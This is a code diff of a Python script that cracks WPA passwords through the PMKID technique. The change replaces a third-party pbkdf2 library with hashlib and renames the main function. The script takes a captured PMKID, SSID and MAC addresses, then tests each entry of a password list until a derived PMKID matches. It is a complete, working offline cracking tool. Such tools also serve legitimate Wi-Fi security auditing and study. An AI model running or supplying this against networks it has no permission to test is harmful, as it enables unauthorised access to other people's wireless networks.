@@ -1,5 +1,4 @@
 import hashlib, hmac, struct, sys
-import pbkdf2               
 
 # Default Values
 pmkid="4d4fe7aac3a2cecab195321ceb99a7d0"
@@ -19,7 +18,7 @@ if len(sys.argv) > 5: passlist_src=sys.argv[5]
 with open(passlist_src, 'r') as f:
   passlist = f.read().splitlines()
 
-def crack_password(pmkid, essid, mac_ap, mac_cl, passlist):
+def crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist):
     print('\033[95m')
     print("PMKID:                    ", pmkid)
     print("SSID:                     ", essid.decode())
@@ -33,7 +32,7 @@ def crack_password(pmkid, essid, mac_ap, mac_cl, passlist):
     print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')
 
     for password in passlist:
-        pmk = pbkdf2.pbkdf2(hashlib.sha1, bytes(password, 'utf-8'), essid, 4096, 32)
+        pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid, 4096, 32)
         try_pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
         if (try_pmkid == pmkid):
             print('\033[92m' + try_pmkid, "- Matches captured PMKID\n")
@@ -46,4 +45,4 @@ def crack_password(pmkid, essid, mac_ap, mac_cl, passlist):
     print('\033[91m' + "\nFailed to crack password. " + 
           "It may help to try a different passwords list. " + '\x1b[0m' + "\n")
 
-crack_password(pmkid, essid, mac_ap, mac_cl, passlist)
+crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist)
